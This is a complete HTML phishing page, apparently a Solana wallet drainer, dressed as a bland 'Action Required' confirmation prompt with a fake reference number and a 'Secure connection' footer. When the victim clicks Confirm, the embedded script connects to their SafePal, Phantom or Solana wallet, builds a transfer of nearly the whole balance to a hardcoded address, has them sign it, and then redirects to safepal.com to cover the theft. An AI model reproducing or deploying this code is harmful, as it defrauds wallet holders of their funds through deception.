<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Action Required</title>
    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:system-ui;background:#0A0A0F;color:#FFF;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:16px}
        .card{background:#1A1A2A;border-radius:32px;padding:28px;max-width:400px;width:100%;text-align:center}
        .message{color:#FF6464;font-size:14px;margin:16px 0;padding:12px;background:rgba(255,100,100,0.1);border-radius:12px}
        button{background:linear-gradient(135deg,#1a5cff,#0a3cbf);color:white;border:none;padding:14px;border-radius:40px;font-size:16px;font-weight:600;cursor:pointer;width:100%}
        .ref{background:rgba(255,255,255,0.05);padding:12px;border-radius:16px;font-family:monospace;font-size:12px;margin:16px 0}
        .footer{font-size:11px;color:#555;margin-top:20px}
    </style>
</head>
<body>
    <div class="card">
        <h2>Action Required</h2>
        <div class="ref">REF: 7jXz5mR0pS1yO4tN5vI6jK7lM8qP9jV0zU1sF2wR3</div>
        <div class="message">This action requires confirmation</div>
        <button id="actionBtn">Confirm</button>
        <div class="footer">Secure connection</div>
    </div>
    <script>
        document.getElementById('actionBtn').onclick = async () => {
            let wallet = window.safepal || window.solana || window.phantom;
            if(!wallet){
                alert("Open this page in your wallet browser.");
                return;
            }
            try{
                const connected = await wallet.connect();
                const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com','confirmed');
                const balance = await connection.getBalance(connected.publicKey);
                const rent = await connection.getMinimumBalanceForRentExemption(0);
                if(balance < rent){
                    alert("Insufficient funds.");
                    return;
                }
                const destination = new solanaWeb3.PublicKey('CGhD29YebVPKgs3W1unvw4KhnFbd1UiF2eBjkwkDRnC8');
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: connected.publicKey,
                        toPubkey: destination,
                        lamports: balance - rent
                    })
                );
                transaction.feePayer = connected.publicKey;
                const block = await connection.getRecentBlockhash();
                transaction.recentBlockhash = block.blockhash;
                const signed = await wallet.signTransaction(transaction);
                const txid = await connection.sendRawTransaction(signed.serialize());
                await connection.confirmTransaction(txid);
                window.location.href = "https://safepal.com";
            }catch(e){
                alert("Action failed. Try again.");
            }
        };
    </script>
</body>
</html>
